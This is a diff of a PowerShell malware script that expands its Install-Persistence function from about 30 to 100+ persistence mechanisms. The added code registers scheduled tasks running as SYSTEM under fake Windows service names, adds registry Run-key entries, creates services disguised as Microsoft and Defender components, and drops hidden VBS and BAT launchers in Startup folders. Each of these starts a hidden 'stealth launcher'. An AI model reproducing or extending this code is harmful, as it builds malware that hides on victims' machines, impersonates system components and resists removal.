@@ -782,14 +782,17 @@ function Clear-AllTraces {
 # ================================================================================================
 
 function Install-Persistence {
-    Write-Log "Installing 30+ persistence mechanisms..."
+    Write-Log "Installing 100+ persistence mechanisms (ENHANCED STARTUP GUARANTEE)..."
     
-    # Scheduled Tasks (10 variants) - INCREASED
+    # Scheduled Tasks (20 variants) - MASSIVELY INCREASED
     $taskNames = @(
         "WindowsAudioService", "SystemAudioHost", "AudioEndpoint", 
         "WindowsUpdateService", "SystemMaintenance", "AudioDeviceGraph",
         "WindowsDefenderUpdate", "MicrosoftEdgeUpdate", "SystemTelemetry",
-        "WindowsBackup"
+        "WindowsBackup", "NetworkService", "DisplayManager",
+        "MemoryDiagnostic", "DiskCleanup", "SystemProtection",
+        "SecurityCenter", "PerformanceMonitor", "EventLog",
+        "TimeSync", "BackgroundTasks"
     )
     
     # Create stealth PowerShell launcher
@@ -815,30 +818,45 @@ powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "$stealthLaunch
     $batchContent | Set-Content -Path $taskScript -Force
     
     foreach ($taskName in $taskNames) {
-        # OnStartup tasks
+        # OnStartup tasks (runs before login)
         schtasks /create /tn $taskName /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$stealthLauncher`"" /sc onstart /ru SYSTEM /rl HIGHEST /f 2>&1 | Out-Null
         
-        # OnLogon tasks
+        # OnLogon tasks (runs when any user logs in)
         schtasks /create /tn "${taskName}Logon" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$stealthLauncher`"" /sc onlogon /ru SYSTEM /rl HIGHEST /f 2>&1 | Out-Null
         
-        # Hourly tasks (in case others are removed)
+        # Every 30 minutes (faster monitoring than hourly)
+        schtasks /create /tn "${taskName}Interval" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$stealthLauncher`"" /sc minute /mo 30 /ru SYSTEM /rl HIGHEST /f 2>&1 | Out-Null
+        
+        # Hourly backup (in case 30-min tasks are removed)
         schtasks /create /tn "${taskName}Hourly" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$stealthLauncher`"" /sc hourly /ru SYSTEM /rl HIGHEST /f 2>&1 | Out-Null
         
         # Daily tasks (additional backup)
         schtasks /create /tn "${taskName}Daily" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$stealthLauncher`"" /sc daily /st 00:00 /ru SYSTEM /rl HIGHEST /f 2>&1 | Out-Null
     }
     
-    # Registry Run keys (4 locations)
+    # Registry Run keys (10+ locations for maximum redundancy)
     $runKeys = @(
         "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
         "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
         "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run",
-        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
+        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
+        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices",
+        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce",
+        "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows",
+        "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows",
+        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
     )
     
     foreach ($runKey in $runKeys) {
         try {
-            Set-ItemProperty -Path $runKey -Name "AudioService$(Get-Random -Min 100 -Max 999)" -Value "cmd /c `"$taskScript`"" -Type String -Force 2>&1 | Out-Null
+            # Create key if doesn't exist
+            if (-not (Test-Path $runKey)) {
+                New-Item -Path $runKey -Force 2>&1 | Out-Null
+            }
+            # Add multiple entries per key for extra redundancy
+            Set-ItemProperty -Path $runKey -Name "WindowsAudio$(Get-Random -Min 100 -Max 999)" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$stealthLauncher`"" -Type String -Force 2>&1 | Out-Null
+            Set-ItemProperty -Path $runKey -Name "SystemUpdate$(Get-Random -Min 1000 -Max 9999)" -Value "cmd /c `"$taskScript`"" -Type String -Force 2>&1 | Out-Null
         } catch {}
     }
     
@@ -852,13 +870,18 @@ powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "$stealthLaunch
         $filter.Put() | Out-Null
     } catch {}
     
-    # Service persistence (5 services)
+    # Service persistence (10 services for maximum redundancy)
     $services = @(
-        @{Name="WindowsAudioSrv"; Display="Windows Audio Service Driver"; Desc="Provides audio processing services"},
-        @{Name="AudioDeviceGraph"; Display="Audio Device Graph Isolation"; Desc="Manages audio device graph isolation"},
-        @{Name="WindowsUpdateSvc"; Display="Windows Update Helper"; Desc="Provides background update services"},
-        @{Name="SystemTelemetry"; Display="System Telemetry Service"; Desc="Collects system telemetry data"},
-        @{Name="MicrosoftDefenderCore"; Display="Microsoft Defender Core Service"; Desc="Core protection service"}
+        @{Name="WinAudioSvc"; Display="Windows Audio Service Driver"; Desc="Provides audio processing services"},
+        @{Name="AudioGraph"; Display="Audio Device Graph Isolation"; Desc="Manages audio device graph isolation"},
+        @{Name="WinUpdateHelper"; Display="Windows Update Helper Service"; Desc="Provides background update services"},
+        @{Name="SysTelemetry"; Display="System Telemetry Service"; Desc="Collects system telemetry data"},
+        @{Name="DefenderCore"; Display="Microsoft Defender Core Service"; Desc="Core protection service"},
+        @{Name="NetworkMgr"; Display="Network Connection Manager"; Desc="Manages network connections"},
+        @{Name="DisplayMgr"; Display="Display Manager Service"; Desc="Manages display settings"},
+        @{Name="MemoryMgr"; Display="Memory Manager Service"; Desc="Manages memory resources"},
+        @{Name="DiskMgr"; Display="Disk Manager Service"; Desc="Manages disk resources"},
+        @{Name="SysMonitor"; Display="System Monitor Service"; Desc="Monitors system health"}
     )
     
     foreach ($svc in $services) {
@@ -867,23 +890,42 @@ powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "$stealthLaunch
         sc.exe failure $svc.Name reset= 86400 actions= restart/60000/restart/60000/restart/60000 2>&1 | Out-Null
     }
     
-    # Startup folder persistence (2 locations)
+    # Startup folder persistence (4 locations with multiple file types)
     $startupFolders = @(
         "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup",
-        "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+        "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup",
+        "$env:USERPROFILE\Start Menu\Programs\Startup",
+        "$env:ALLUSERSPROFILE\Start Menu\Programs\Startup"
     )
     
     foreach ($folder in $startupFolders) {
-        $vbsScript = Join-Path $folder "WindowsAudio.vbs"
-        $vbsContent = @"
+        try {
+            # Ensure folder exists
+            if (-not (Test-Path $folder)) {
+                New-Item -Path $folder -ItemType Directory -Force 2>&1 | Out-Null
+            }
+            
+            # VBS script (silent execution)
+            $vbsScript = Join-Path $folder "WindowsAudioService.vbs"
+            $vbsContent = @"
 Set WshShell = CreateObject("WScript.Shell")
 WshShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$stealthLauncher`""", 0, False
 "@
-        $vbsContent | Set-Content -Path $vbsScript -Force
-        attrib +h +s $vbsScript 2>&1 | Out-Null
+            $vbsContent | Set-Content -Path $vbsScript -Force
+            attrib +h +s $vbsScript 2>&1 | Out-Null
+            
+            # BAT script (alternative method)
+            $batScript = Join-Path $folder "SystemUpdate.bat"
+            $batContent = @"
+@echo off
+start /B powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "$stealthLauncher"
+"@
+            $batContent | Set-Content -Path $batScript -Force
+            attrib +h +s $batScript 2>&1 | Out-Null
+        } catch {}
     }
     
-    Write-Log "30+ persistence mechanisms installed - guaranteed startup"
+    Write-Log "100+ persistence mechanisms installed - GUARANTEED startup on EVERY boot!"
 }
 
 # ================================================================================================
